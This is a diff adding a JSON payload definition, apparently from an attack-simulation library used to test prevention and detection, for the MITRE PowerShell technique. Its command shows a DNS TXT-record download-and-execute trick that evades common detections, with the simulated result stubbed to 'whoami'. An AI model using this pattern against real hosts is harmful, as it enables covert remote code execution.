@@ -1,0 +1,52 @@
+{
+  "export_version": 1,
+  "native_collection": true,
+  "payload_information": {
+    "payload_type": "Command",
+    "payload_name": "Abuse Nslookup with DNS Records",
+    "payload_description": "Red teamer's avoid IEX and Invoke-WebRequest in your PowerShell commands. Instead, host a text record with a payload to compromise hosts.\n[reference](https://twitter.com/jstrosch/status/1237382986557001729)\n",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_attack_patterns": [
+      {
+        "attack_pattern_id": "14080352-5e7a-418e-bc3a-36517570782e",
+        "attack_pattern_name": "PowerShell",
+        "attack_pattern_description": "Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.(Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  [PowerSploit](https://attack.mitre.org/software/S0194), [PoshC2](https://attack.mitre.org/software/S0378), and PSAttack.(Citation: Github PSAttack)\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp APR 2014)",
+        "attack_pattern_external_id": "T1059.001",
+        "attack_pattern_kill_chain_phases": null
+      }
+    ],
+    "payload_cleanup_executor": null,
+    "payload_cleanup_command": null,
+    "payload_elevation_required": false,
+    "payload_arguments": [],
+    "payload_prerequisites": [],
+    "payload_external_id": "c900ee64-bec7-4ebf-abf8-64da7e2e70df",
+    "payload_source": "FILIGRAN",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_status": "VERIFIED",
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_detection_remediations": [],
+    "payload_tags": [],
+    "payload_output_parsers": [],
+    "payload_created_at": "2025-08-24T10:16:02.282219Z",
+    "payload_updated_at": "2025-08-24T10:16:45.159812Z",
+    "command_executor": "psh",
+    "command_content": "# creating a custom nslookup function that will indeed call nslookup but forces the result to be \"whoami\"\n# this would not be part of a real attack but helpful for this simulation\nfunction nslookup  { &\"$env:windir\\system32\\nslookup.exe\" @args | Out-Null; @(\"\",\"whoami\")}\npowershell .(nslookup -q=txt example.com 8.8.8.8)[-1]\n"
+  },
+  "payload_tags": [],
+  "payload_attack_patterns": [
+    {
+      "attack_pattern_id": "14080352-5e7a-418e-bc3a-36517570782e",
+      "attack_pattern_name": "PowerShell",
+      "attack_pattern_description": "Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.(Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  [PowerSploit](https://attack.mitre.org/software/S0194), [PoshC2](https://attack.mitre.org/software/S0378), and PSAttack.(Citation: Github PSAttack)\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp APR 2014)",
+      "attack_pattern_external_id": "T1059.001",
+      "attack_pattern_kill_chain_phases": null
+    }
+  ],
+  "payload_arguments_documents": []
+}
